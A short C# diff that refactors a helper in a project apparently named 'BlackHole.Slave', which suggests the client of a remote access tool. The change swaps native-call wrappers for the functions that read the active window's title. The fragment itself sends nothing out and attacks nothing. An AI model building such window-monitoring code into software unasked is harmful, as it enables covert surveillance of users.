@@ -1,4 +1,5 @@
-﻿using System;
+﻿using BlackHole.Slave.Helper.Native.Impl;
+using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
@@ -61,7 +62,7 @@ namespace BlackHole.Slave.Helper
         {
             StringBuilder sbTitle = new StringBuilder(1024);
 
-            NativeHelper.user32.GetWindowText(NativeHelper.user32.GetForegroundWindow(), sbTitle,
+            User32.GetWindowText(User32.GetForegroundWindow(), sbTitle,
                 sbTitle.Capacity);
 
             string title = sbTitle.ToString();
